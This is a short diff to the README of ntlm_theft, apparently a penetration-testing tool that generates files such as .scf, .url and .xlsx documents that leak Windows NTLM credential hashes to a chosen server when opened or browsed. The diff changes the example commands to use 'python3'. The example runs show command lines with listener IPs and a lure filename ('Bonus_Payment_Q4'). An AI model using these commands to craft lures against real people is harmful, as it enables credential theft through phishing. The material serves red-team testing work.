@@ -77,7 +77,7 @@ To start up the tool 4 parameters must be provided, an input format, the input f
 Here is an example of what a run looks like generating all files:
 
 ```
-# ntlm_theft -g all -s 127.0.0.1 -f test
+# python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
 Created: test/test.scf (BROWSE)
 Created: test/test-(url).url (BROWSE)
 Created: test/test-(icon).url (BROWSE)
@@ -103,7 +103,7 @@ Generation Complete.
 Here is an example of what a run looks like generating only modern files:
 
 ```
-# ntlm_theft -g modern -s 127.0.0.1 -f meeting
+# python3 ntlm_theft.py -g modern -s 127.0.0.1 -f meeting
 Skipping SCF as it does not work on modern Windows
 Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
 Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
@@ -129,7 +129,7 @@ Generation Complete.
 Here is an example of what a run looks like generating only a xlsx file:
 
 ```
-# ntlm_theft.py -g xlsx -s 192.168.1.103 -f Bonus_Payment_Q4
+# python3 ntlm_theft.py -g xlsx -s 192.168.1.103 -f Bonus_Payment_Q4
 Created: Bonus_Payment_Q4/Bonus_Payment_Q4-(externalcell).xlsx (OPEN)
 Generation Complete.
 ```
